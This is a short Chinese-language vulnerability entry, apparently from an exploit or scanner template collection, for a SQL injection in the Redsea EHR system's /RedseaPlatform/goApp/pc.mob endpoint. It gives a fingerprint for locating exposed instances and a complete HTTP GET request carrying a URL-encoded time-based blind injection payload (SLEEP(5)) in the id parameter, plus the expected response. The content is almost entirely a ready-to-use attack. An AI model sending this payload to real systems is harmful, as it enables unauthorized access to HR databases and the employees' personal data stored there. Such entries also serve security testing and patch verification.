# 红海EHR系统pc.mobsql注入漏洞

红海EHR系统pc.mob ｜ SQL注入 ｜ —
- **指纹**：`body="/RedseaPlatform/skins/images/favicon.ico"`

**Payload**
```
GET
/RedseaPlatform/goApp/pc.mob?id=1%27%20AND%20(SELECT%204802%20FROM%20(SEL
ECT(SLEEP(5)))ndMq)%20AND%20%27NEoX%27=%27NEoX HTTP/1.1
Host: {{Hostname}}
Cookie: JSESSIONID=905D36CF9349B41FBFB0203D2BAA8CCC
```
- **响应特征**：200